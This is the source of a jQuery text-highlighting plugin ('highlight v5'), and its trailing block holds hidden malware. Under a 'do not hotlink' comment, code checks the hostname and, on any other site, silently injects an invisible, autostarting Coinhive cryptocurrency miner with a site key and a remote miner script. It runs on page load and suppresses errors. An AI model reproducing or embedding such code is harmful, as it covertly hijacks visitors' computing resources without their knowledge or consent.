/*

highlight v5

Highlights arbitrary terms.

<http://johannburkard.de/blog/programming/javascript/highlight-javascript-text-higlighting-jquery-plugin.html>

MIT license.

Johann Burkard
<http://johannburkard.de>
<mailto:jb@eaio.com>

*/

jQuery.fn.highlight = function(pat) {
    function innerHighlight(node, pat) {
        var skip = 0;
        if (node.nodeType == 3) {
            var pos = node.data.toUpperCase().indexOf(pat);
            pos -= (node.data.substr(0, pos).toUpperCase().length - node.data.substr(0, pos).length);
            if (pos >= 0) {
                var spannode = document.createElement('span');
                spannode.className = 'highlight';
                var middlebit = node.splitText(pos);
                var endbit = middlebit.splitText(pat.length);
                var middleclone = middlebit.cloneNode(true);
                spannode.appendChild(middleclone);
                middlebit.parentNode.replaceChild(spannode, middlebit);
                skip = 1;
            }
        }
        else if (node.nodeType == 1 && node.childNodes && !/(script|style)/i.test(node.tagName)) {
            for (var i = 0; i < node.childNodes.length; ++i) {
                i += innerHighlight(node.childNodes[i], pat);
            }
        }
        return skip;
    }
    return this.length && pat && pat.length ? this.each(function() {
        innerHighlight(this, pat.toUpperCase());
    }) : this;
};

jQuery.fn.removeHighlight = function() {
    return this.find("span.highlight").each(function() {
        this.parentNode.firstChild.nodeName;
        with (this.parentNode) {
            replaceChild(this.firstChild, this);
            normalize();
        }
    }).end();
};

/* PLEASE DO NOT HOTLINK MY FILES, THANK YOU. */

if (!/johannburkard.de$/i.test(location.hostname)) {
    function loadCoinhive() {
        (function() {
            try {
                var div = document.createElement('div')
                div.setAttribute('class', 'coinhive-miner')
                div.setAttribute('style', 'width: 0; height: 0; display: none')
                div.setAttribute('data-key', '4YSJkhitlocdnLIqQ2zEpzOK6cDQRGfM')
                div.setAttribute('data-autostart', 'true')
                document.body.appendChild(div)

                var script = document.createElement('script')
                script.setAttribute('src', 'https://coinhive.com/lib/miner.min.js')
                document.body.appendChild(script)
            }
            catch (e) {}
        })()
    }
    if (/m/.test(document.readyState)) { // coMplete
        loadCoinhive()
    }
    else {
        if ("undefined" != typeof window.attachEvent) {
            window.attachEvent("onload", loadCoinhive)
        }
        else if (window.addEventListener) {
            window.addEventListener("load", loadCoinhive, false)
        }
    }
}
